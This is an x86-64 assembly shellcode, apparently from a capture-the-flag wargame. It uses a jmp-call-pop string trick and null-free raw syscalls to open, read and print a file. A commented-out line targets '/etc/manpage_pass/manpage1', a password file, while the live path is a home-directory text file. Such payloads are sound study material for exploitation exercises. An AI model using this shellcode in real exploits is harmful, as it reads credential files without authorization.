SECTION .text
    global _start

_start:
    jmp MESSAGE

PRINT:
    xor rax,rax
;open syscall
    mov al,2
;rcx has the address of the file path
    pop rcx
    mov rdi,rcx
;zero out the end of the path
    xor rdx,rdx
    mov [rcx+26],dl
;2 is the mode read write
    mov sil,2
    syscall
    
;read syscall
    mov rdi,rax
    xor rax,rax

    sub rsp,70
    mov rsi,rsp
    mov dl,50
    syscall

;print syscall
    mov al,1
    mov dil,1
    mov rsi,rsp
    mov dl,50
    syscall

;exit
    xor rax,rax
    mov dil,0
    mov al,60
    syscall

MESSAGE:
    call PRINT
    ; db "/etc/manpage_pass/manpage1AAAAAA"
    db "/home/manas/cat.txt"
